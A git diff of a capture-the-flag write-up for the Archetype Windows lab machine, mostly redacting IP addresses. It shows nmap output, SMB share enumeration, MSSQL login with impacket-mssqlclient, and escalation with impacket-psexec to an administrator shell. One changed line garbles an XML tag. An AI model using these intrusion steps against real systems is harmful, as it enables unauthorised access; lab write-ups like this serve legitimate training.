@@ -1,11 +1,11 @@
-# Archetype    Windows    Easy    04-03-26
+# Archetype    Windows    Easy    04-04-26
 
 
 ## 0. Machine Info
 Name        :  Archetype
 OS          : Windows
 Difficulty  : Easy
-Pwned Date  : 
+Pwned Date  : 04-04-26
 Status      : Starting Point
 Tags        : SMB, MSSQL
 
@@ -14,9 +14,9 @@ Tags        : SMB, MSSQL
 
 ### 1.1 Nmap
 # Initial fast scan
-nmap -Pn -sS -sV -sC 10.129.55.115
+nmap -Pn -sS -sV -sC 10.xx.xx.xx
 
-Nmap scan report for 10.129.55.115
+Nmap scan report for 10.xx.xx.xx
 
 Not shown: 995 closed tcp ports (reset)
 PORT     STATE SERVICE      VERSION
@@ -25,7 +25,7 @@ PORT     STATE SERVICE      VERSION
 445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
 1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
 | ms-sql-ntlm-info: 
-|   10.129.55.115:1433: 
+|   10.xx.xx.xx:1433: 
 |     Target_Name: ARCHETYPE
 |     NetBIOS_Domain_Name: ARCHETYPE
 |     NetBIOS_Computer_Name: ARCHETYPE
@@ -37,7 +37,7 @@ PORT     STATE SERVICE      VERSION
 | Not valid before: 2026-04-01T14:40:00
 |_Not valid after:  2056-04-01T14:40:00
 | ms-sql-info: 
-|   10.129.55.115:1433: 
+|   10.xx.xx.xx:1433: 
 |     Version: 
 |       name: Microsoft SQL Server 2017 RTM
 |       number: 14.00.1000.00
@@ -93,7 +93,7 @@ PORT 1433/tcp
   
   
   # Commands smb
-$ smbclient -L 10.129.55.115 
+$ smbclient -L 10.xx.xx.xx 
 Password for [WORKGROUP\ *****]:
 
         Sharename       Type      Comment
@@ -104,7 +104,7 @@ Password for [WORKGROUP\ *****]:
         IPC$            IPC       Remote IPC
 
   
-$ smbclient \\\\10.129.55.115\\backups
+$ smbclient \\\\10.xx.xx.xx\\backups
 Password for [WORKGROUP\tsfahmd01]:
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -119,7 +119,7 @@ getting file \prod.dtsConfig of size 609 as prod.dtsConfig (1.0 KiloBytes/sec) (
 
 $ cat prod.dtsConfig
   <DTSConfiguration>
-    <DTSConfigurationHeading>
+    <DTSConfigurationHeadi10.ng>
         <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
     </DTSConfigurationHeading>
     <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
@@ -160,7 +160,7 @@ Steps:
 3. set-up listener execute binary
 
 Key command(s):
-  $ impacket-mssqlclient ARCHETYPE/sql_svc@10.129.95.187 -windows-auth
+  $ impacket-mssqlclient ARCHETYPE/sql_svc@10.xx.xx.xx -windows-auth
   # ..................... ^domain^/username  ^^^ip^^^
 
 Shell obtained:
@@ -198,7 +198,7 @@ Steps:
 3. access
 
 Key command:
-  impacket-psexec administrator@10.10.xx.xx
+  impacket-psexec administrator@10.xx.xx.xx
 
 Result: root shell obtained
 
